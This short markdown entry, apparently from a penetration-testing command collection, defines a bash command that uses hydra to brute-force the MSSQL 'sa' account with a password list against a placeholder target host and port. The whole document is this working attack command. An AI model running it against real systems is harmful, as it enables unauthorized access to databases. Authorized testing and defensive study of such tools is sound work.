---
id: 52651580-860b-4af9-a834-943bf97c7204
name: bruteforce mssql
type: command
executor: bash
data: 'hydra -l sa -P ../creds/pass.txt target-ip -s target-port mssql

  '
output: null
created_at: '2020-07-14T18:14:30.728624+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# bruteforce mssql

```bash
hydra -l sa -P ../creds/pass.txt target-ip -s target-port mssql

```


